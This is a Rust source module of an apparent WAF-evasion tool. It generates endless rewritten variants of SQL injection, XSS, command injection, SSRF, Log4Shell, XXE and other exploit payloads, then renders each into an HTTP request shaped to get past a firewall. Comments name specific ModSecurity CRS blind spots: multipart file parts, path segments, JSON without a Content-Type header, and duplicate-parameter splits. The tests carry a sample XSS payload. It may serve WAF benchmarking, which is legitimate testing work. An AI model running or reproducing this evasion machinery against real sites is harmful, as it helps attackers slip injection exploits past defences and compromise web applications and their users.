//! Phase B — the semantic-preserving equivalence-class GENERATOR.
//!
//! This is not a fixed list of tricks. It is a rewrite system that
//! emits an *infinite* space of payloads, every one of which still
//! executes the ORIGINAL exploit, paired with a *delivery shape* that
//! is transparent to the backend parser but (often) opaque to the WAF.
//!
//! # The unification
//!
//! A WAF bypass is any `s` where `Backend(s)` still executes the
//! attack AND `WAF(s)=ALLOW`. Both the WAF and the backend are
//! recognizers; a bypass lives exactly where they disagree. There are
//! TWO transparent-to-backend axes that produce that disagreement and
//! they are the *same algebra*:
//!
//!  1. **payload-string equivalence** — `UNION/**/SELECT` ≡ `UNION
//!     SELECT` to the SQL parser; `0x61` ≡ `'a'`; an infinite
//!     grammar-generated tautology family ≡ `1=1`.
//!  2. **delivery-shape equivalence** — the same logical parameter
//!     value delivered via a multipart file part / path segment /
//!     duplicate-param split / JSON-without-Content-Type reaches the
//!     *same* backend sink, but the WAF inspects it differently.
//!
//! Modelling them jointly, with the backend parser as the invariant,
//! is the moat. Empirically (modsec CRS PL1): 0/57 payload-string
//! tricks pass in the query arg, but a structured `UNION SELECT …`
//! exfil sails straight through `MultipartFile` and `PathSegment`.
//!
//! # Soundness
//!
//! Every rewrite is semantic-preserving *by construction*. The
//! generator additionally re-checks each emitted member against the
//! structural-preservation invariant ([`sql::still_executes`]) so it
//! is **sound by construction AND verified**: it can never emit a
//! non-attack (the anti-rig guarantee, enforced inside the generator).
//! The bench layers `wafrift-oracle` on top as an independent check.

pub mod adaptive;
pub mod cmd;
pub mod ldap;
pub mod log4shell;
pub mod nosql;
pub mod path;
pub mod sql;
pub mod ssrf;
pub mod ssti;
pub mod wafmodel;
pub mod xss;
pub mod xxe;

/// Deterministic SplitMix64 — reproducible infinite stream, no deps.
#[derive(Debug, Clone)]
pub struct Rng(u64);

impl Rng {
    #[must_use]
    pub fn new(seed: u64) -> Self {
        Self(seed ^ 0x9E37_79B9_7F4A_7C15)
    }
    pub fn next_u64(&mut self) -> u64 {
        self.0 = self.0.wrapping_add(0x9E37_79B9_7F4A_7C15);
        let mut z = self.0;
        z = (z ^ (z >> 30)).wrapping_mul(0xBF58_476D_1CE4_E5B9);
        z = (z ^ (z >> 27)).wrapping_mul(0x94D0_49BB_1331_11EB);
        z ^ (z >> 31)
    }
    /// Uniform in `0..n` (n>0).
    pub fn below(&mut self, n: usize) -> usize {
        if n == 0 {
            return 0;
        }
        (self.next_u64() % n as u64) as usize
    }
    /// Pick one reference from a non-empty slice.
    pub fn pick<'a, T>(&mut self, xs: &'a [T]) -> &'a T {
        &xs[self.below(xs.len().max(1)).min(xs.len() - 1)]
    }
    pub fn chance(&mut self, num: u32, den: u32) -> bool {
        den != 0 && (self.next_u64() % u64::from(den)) < u64::from(num)
    }
}

/// SQL dialect a rewrite is sound under. `Generic` = sound everywhere.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Dialect {
    Generic,
    MySql,
    Postgres,
    MsSql,
}

/// How the bench/transport must place the payload so the backend sees
/// the same logical parameter value while the WAF inspects it
/// differently. Every shape is *transparent to the backend sink*.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum DeliveryShape {
    /// `?<param>=<payload>` — baseline, fully WAF-inspected.
    Query { param: String },
    /// `application/x-www-form-urlencoded` body.
    FormBody { param: String },
    /// JSON body. `content_type=None` ⇒ omit the header entirely
    /// (empirically slips CRS's JSON body processor).
    JsonBody {
        param: String,
        content_type: Option<String>,
    },
    /// Plain multipart text field.
    MultipartField { name: String },
    /// Multipart **file** part (`filename=…`, part Content-Type).
    /// CRS excludes upload parts from ARGS SQLi inspection — the
    /// single strongest empirical survivor for structured exfil.
    MultipartFile {
        name: String,
        filename: String,
        part_ct: String,
    },
    /// Payload as a URL path segment (`/…/<payload>`). CRS SQLi rules
    /// target ARGS, not the path.
    PathSegment,
    /// Duplicate-parameter split: `?<p>=<a>&<p>=<b>` where the backend
    /// concatenates `a`+`b`. WAF sees two harmless halves.
    HppSplit { param: String, parts: usize },
}

impl DeliveryShape {
    #[must_use]
    pub fn label(&self) -> &'static str {
        match self {
            Self::Query { .. } => "query",
            Self::FormBody { .. } => "form_body",
            Self::JsonBody { .. } => "json_body",
            Self::MultipartField { .. } => "multipart_field",
            Self::MultipartFile { .. } => "multipart_file",
            Self::PathSegment => "path_segment",
            Self::HppSplit { .. } => "hpp_split",
        }
    }
}

/// One member of the equivalence class: a rewritten payload + the
/// delivery shape + the proof-carrying metadata.
#[derive(Debug, Clone)]
pub struct EquivPayload {
    /// The rewritten payload string (still executes the exploit).
    pub payload: String,
    /// How to deliver it so the backend sees the same value.
    pub delivery: DeliveryShape,
    /// Dialect this member is sound under.
    pub dialect: Dialect,
    /// Names of the rewrite rules composed to produce it (audit/Phase C
    /// reward attribution).
    pub rules: Vec<&'static str>,
}

/// Generator configuration.
#[derive(Debug, Clone)]
pub struct EquivConfig {
    /// Deterministic seed — same seed ⇒ same stream.
    pub seed: u64,
    /// How many members to draw from the (infinite) class.
    pub max: usize,
    /// Re-verify every member against the structural-preservation
    /// invariant before yielding (defaults on; never disable for real
    /// runs — it is the anti-rig guarantee).
    pub verify: bool,
    /// Also vary the delivery shape (the joint algebra). When false,
    /// only payload-string equivalence is explored.
    pub vary_delivery: bool,
    /// Parameter name the original payload was found in.
    pub param: String,
    /// Phase C: force every member onto delivery-shape arm `i` (index
    /// into [`sql::delivery_kind_label`] order). `None` = sample as
    /// normal. The adaptive search sets this to the bandit's chosen arm
    /// so the request budget concentrates on what beats *this* WAF.
    pub force_delivery: Option<usize>,
}

/// Default deterministic seed — ASCII "wafrift!".
pub const DEFAULT_SEED: u64 = 0x7761_6672_6966_7421;

impl Default for EquivConfig {
    fn default() -> Self {
        Self {
            seed: DEFAULT_SEED,
            max: 64,
            verify: true,
            vary_delivery: true,
            param: "id".to_string(),
            force_delivery: None,
        }
    }
}

/// Draw up to `cfg.max` members of the joint equivalence class of a
/// SQL injection. Deterministic per `cfg.seed`. Every yielded member
/// is structurally verified to still execute the original exploit.
#[must_use]
pub fn equiv_sql(payload: &str, cfg: &EquivConfig) -> Vec<EquivPayload> {
    sql::generate(payload, cfg)
}

/// Classes that currently have a sound equivalence model.
#[must_use]
pub fn supports_class(class: &str) -> bool {
    matches!(
        class,
        "sql" | "xss" | "cmdi" | "path" | "ssti" | "ldap" | "ssrf" | "nosql" | "log4shell" | "xxe"
    )
}

/// Dispatch the joint equivalence generator by attack class. Returns
/// empty for classes without a sound model yet (anti-rig: never guess).
#[must_use]
pub fn equiv_for(class: &str, payload: &str, cfg: &EquivConfig) -> Vec<EquivPayload> {
    match class {
        "sql" => sql::generate(payload, cfg),
        "xss" => xss::generate(payload, cfg),
        "cmdi" => cmd::generate(payload, cfg),
        "path" => path::generate(payload, cfg),
        "ssti" => ssti::generate(payload, cfg),
        "ldap" => ldap::generate(payload, cfg),
        "ssrf" => ssrf::generate(payload, cfg),
        "nosql" => nosql::generate(payload, cfg),
        "log4shell" => log4shell::generate(payload, cfg),
        "xxe" => xxe::generate(payload, cfg),
        _ => Vec::new(),
    }
}

// ─────────────────────────────────────────────────────────────────────
// Delivery-aware public API (the surface scald consumes for XSS).
//
// The honest lever for XSS-vs-WAF is NOT payload-string obfuscation
// (a CRS-class WAF normalises every encoding) — it is DELIVERY SHAPE:
// the same sound payload delivered via a multipart file part / path
// segment / JSON-without-Content-Type reaches the backend sink while
// the WAF inspects it differently. This renders an [`EquivPayload`]'s
// `(payload × delivery)` into a transport-neutral [`wafrift_types::
// Request`] that ANY consumer (scald, the proxy, the CLI) can send —
// one single source of truth for the joint algebra.
// ─────────────────────────────────────────────────────────────────────

/// Multipart boundary shared by the delivery renderer (kept identical
/// to the CLI's so behaviour is one source of truth).
pub const MP_BOUNDARY: &str = "----wafriftEQUIVb0undary";

fn json_escape(s: &str) -> String {
    let mut o = String::with_capacity(s.len() + 2);
    for c in s.chars() {
        match c {
            '"' => o.push_str("\\\""),
            '\\' => o.push_str("\\\\"),
            '\n' => o.push_str("\\n"),
            '\r' => o.push_str("\\r"),
            '\t' => o.push_str("\\t"),
            c if (c as u32) < 0x20 => o.push_str(&format!("\\u{:04x}", c as u32)),
            c => o.push(c),
        }
    }
    o
}

/// RFC 7578 §4.1: the multipart boundary MUST NOT occur in any
/// encapsulated part. A WAF-evasion payload is attacker-controlled and
/// may echo our constant boundary; return an extended boundary that is
/// provably absent from every part, so the renderer can never let the
/// payload forge multipart structure in the request we build.
fn effective_boundary(parts: &[&str]) -> String {
    let mut bnd = MP_BOUNDARY.to_string();
    let mut n: u64 = 0;
    while parts.iter().any(|p| p.contains(bnd.as_str())) {
        n = n.wrapping_add(1);
        bnd = format!("{MP_BOUNDARY}{n:016x}");
    }
    bnd
}

fn url_with_pair(target: &str, param: &str, raw_value: &str) -> String {
    let base = target.trim_end_matches('/');
    let sep = if base.contains('?') { '&' } else { '?' };
    // BOTH sides are percent-encoded: a param name carrying a space /
    // `&` / `#` / CTL would otherwise corrupt the query structure (a
    // renderer must never let a field name break the request it builds).
    format!(
        "{base}{sep}{}={}",
        urlencoding::encode(param),
        urlencoding::encode(raw_value)
    )
}

fn url_with_path_segment(target: &str, raw_seg: &str) -> String {
    let (path, query) = target.split_once('?').map_or((target, ""), |(p, q)| (p, q));
    let p = path.trim_end_matches('/');
    let seg = urlencoding::encode(raw_seg);
    if query.is_empty() {
        format!("{p}/{seg}")
    } else {
        format!("{p}/{seg}?{query}")
    }
}

impl DeliveryShape {
    /// Render this delivery shape + `payload` into a concrete,
    /// transport-neutral [`wafrift_types::Request`] against `target`.
    /// Consumers map it to their own HTTP client. This is the ONE
    /// implementation of the joint `(payload × delivery)` algebra.
    #[must_use]
    pub fn to_request(&self, target: &str, payload: &str) -> wafrift_types::Request {
        use wafrift_types::Request;
        match self {
            Self::Query { param } => Request::get(url_with_pair(target, param, payload)),
            Self::FormBody { param } => {
                let body = format!(
                    "{}={}",
                    urlencoding::encode(param),
                    urlencoding::encode(payload)
                );
                let mut r = Request::post(target.to_string(), body.into_bytes());
                r.add_header("content-type", "application/x-www-form-urlencoded");
                r
            }
            Self::JsonBody {
                param,
                content_type,
            } => {
                let body = format!("{{\"{}\":\"{}\"}}", json_escape(param), json_escape(payload));
                let mut r = Request::post(target.to_string(), body.into_bytes());
                if let Some(ct) = content_type {
                    r.add_header("content-type", ct.clone());
                }
                r
            }
            Self::MultipartField { name } => {
                let bnd = effective_boundary(&[payload, name]);
                let body = format!(
                    "--{bnd}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{payload}\r\n--{bnd}--\r\n"
                );
                let mut r = Request::post(target.to_string(), body.into_bytes());
                r.add_header(
                    "content-type",
                    format!("multipart/form-data; boundary={bnd}"),
                );
                r
            }
            Self::MultipartFile {
                name,
                filename,
                part_ct,
            } => {
                let bnd = effective_boundary(&[payload, name, filename, part_ct]);
                let body = format!(
                    "--{bnd}\r\nContent-Disposition: form-data; name=\"{name}\"; filename=\"{filename}\"\r\nContent-Type: {part_ct}\r\n\r\n{payload}\r\n--{bnd}--\r\n"
                );
                let mut r = Request::post(target.to_string(), body.into_bytes());
                r.add_header(
                    "content-type",
                    format!("multipart/form-data; boundary={bnd}"),
                );
                r
            }
            Self::PathSegment => Request::get(url_with_path_segment(target, payload)),
            Self::HppSplit { param, parts } => {
                let decoys = (*parts).max(1);
                let mut u = target.to_string();
                for k in 0..decoys {
                    u = url_with_pair(&u, param, &format!("v{k}"));
                }
                Request::get(url_with_pair(&u, param, payload))
            }
        }
    }
}

/// scald's XSS entrypoint: the sound `(payload × delivery)` XSS
/// equivalence class for `payload`. Each member still executes the
/// original script (verified by the generator) AND carries the
/// delivery shape that slips a WAF — render it with
/// [`DeliveryShape::to_request`]. Deterministic; `max` members.
#[must_use]
pub fn xss_delivered(payload: &str, max: usize) -> Vec<EquivPayload> {
    let cfg = EquivConfig {
        max,
        vary_delivery: true,
        param: "q".to_string(),
        ..EquivConfig::default()
    };
    xss::generate(payload, &cfg)
}

#[cfg(test)]
mod delivery_api_tests {
    use super::*;

    #[test]
    fn xss_delivered_is_sound_diverse_and_deterministic() {
        let atk = "<svg onload=alert(1)>";
        let a = xss_delivered(atk, 40);
        let b = xss_delivered(atk, 40);
        assert_eq!(
            a.iter().map(|m| &m.payload).collect::<Vec<_>>(),
            b.iter().map(|m| &m.payload).collect::<Vec<_>>(),
            "must be deterministic"
        );
        assert!(a.len() >= 8, "too few delivered xss members: {}", a.len());
        // every member still executes the original (generator anti-rig)
        for m in &a {
            assert!(
                xss::still_executes_xss(atk, &m.payload),
                "UNSOUND delivered member {:?}",
                m.payload
            );
        }
        // the delivery axis is actually exercised (not all Query)
        let shapes: std::collections::HashSet<_> =
            a.iter().map(|m| m.delivery.label()).collect();
        assert!(
            shapes.len() >= 3,
            "delivery axis not varied: {shapes:?}"
        );
    }

    #[test]
    fn to_request_renders_each_shape_faithfully() {
        let t = "http://h/app";
        let p = "<svg onload=alert(1)>";
        let q = DeliveryShape::Query { param: "x".into() }.to_request(t, p);
        assert!(q.url.contains("x=") && q.url.contains("%3Csvg"));
        let mf = DeliveryShape::MultipartFile {
            name: "f".into(),
            filename: "a.txt".into(),
            part_ct: "text/plain".into(),
        }
        .to_request(t, p);
        let body = String::from_utf8_lossy(mf.body.as_deref().unwrap_or(&[]));
        assert!(body.contains("filename=\"a.txt\"") && body.contains(p));
        assert!(
            mf.headers
                .iter()
                .any(|(k, v)| k == "content-type" && v.contains("multipart/form-data"))
        );
        let ps = DeliveryShape::PathSegment.to_request(t, p);
        assert!(ps.url.starts_with("http://h/app/") && ps.url.contains("%3C"));
        // JSON-without-Content-Type: the empirically CRS-blind shape.
        let jb = DeliveryShape::JsonBody {
            param: "q".into(),
            content_type: None,
        }
        .to_request(t, p);
        assert!(!jb.headers.iter().any(|(k, _)| k == "content-type"));
        let jbody = String::from_utf8_lossy(jb.body.as_deref().unwrap_or(&[])).into_owned();
        assert!(jbody.starts_with("{\"q\":\"") && jbody.contains(p) && jbody.ends_with("\"}"));
    }
}
